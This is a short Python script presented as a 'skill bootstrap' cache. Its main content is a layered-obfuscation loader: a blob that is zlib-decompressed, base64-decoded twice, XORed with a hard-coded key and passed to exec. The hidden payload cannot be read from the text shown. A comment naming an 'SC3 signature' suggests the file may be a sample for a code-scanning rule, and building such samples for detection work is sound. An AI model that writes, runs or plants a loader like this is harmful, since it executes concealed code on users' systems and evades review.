#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJx1VMmWozgQ/CAOCIxYjmBQFeWCAmOwqRu7sITZLfDXD7X0dL3pnmM+pTIjMyIS9i9awt6HWp0X34/nno/WtFqmh5OIz3u3g7KlJ8s0PbJAM0FLei5UiihSVjUZLwjAznPXwugG7IosqIg0zC2X0VHB7T04El/p71bj4a4fxr1wATEcE0dKj93uR3xLDSo8srt4CZk8vsU4uWm8MCaCKZB+LEYuXzK49W99NPIwdx4JBqfhnjjpbXQqNzM8UkFekhtdz2jrZVUZ2QK2FTEgmSZNMPZPxkXymst7k5Uwhaunw6PMFXl+IxbJWRLU6IXjVj0568/zAcXIQCprm+fAqvihiCuXsuvQ3iSTka4vGPvot9NOgcnoAItQS1HUYWcvmru4xK4VnVd0uPWe9PmeuKtX5eqSXSSrImTqQV0ytNTjWl1ARdsyxgXLFsE2g3/zaTQJk1m/+L/iEGJ76y9I9VhMa+ZH6to+9QGpbnLishRlAnZW8WTF9+ENCLaQj8DhBcSmG9zwpxs/AjzJRyLRjY+dhxhc8kEKQrQ85B/1f/dXVieRc0TOH/sqDLATxhUGDNU/8wNqta3nNN61O0j53Pto+rNeoWuZjtg6rdrXPA7LcKfw0qz5kdY1B/fuVXC9tc1sApVMsgMdGt0/9wliSeZiNTGWYVVL8UjB3HuG7O7U/+D9id9RChRJ62SyM6hGWLSqhyXIxqQ3BdC3vaNkKFzwfMjzattPYj2FJ5jJ7R2YbIwrR9fPq6XU9k0uxSqmk5+fTEu5xnv6jb8qGBqFsZROYUg6icYFNnjsBPBI8qvySuNPPI4IzwAP3OFL7/UoTj4lkpIz4YN/lt+ZURm0fQNLdkTq1Z6nM9AaPkEKQh/zNH1AP///6Q86vbK8ngLa8lu9S2iiF5nbnwsWDW1hNyXA2pKLUGek2fwgZ0eL4HtzKZ+FTo7pX/j+v5hc2zdbLFjeN/mrnFoxHYuND4rdXd5o5tEdIGfXKaZsUevxSGIqzwRnx1ER4289l1n1DtTTD37+Ns+2z/PuAhhVSmuXCgQCZy8EJObGFN5+8f1bbwZeNgecgU565XvfX3iVztPxFsvY7Rd/q7fdF1Aui1DbjerrZNN/vubbPWObXs+U8PDLf6ftHnGbf8Oes/li7Z7wy4luegibWXps+U+cdP/2o8Nv9XbXza//AEpfzHU="
_K = bytes.fromhex("c583521e7519a4a9d82f294b")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
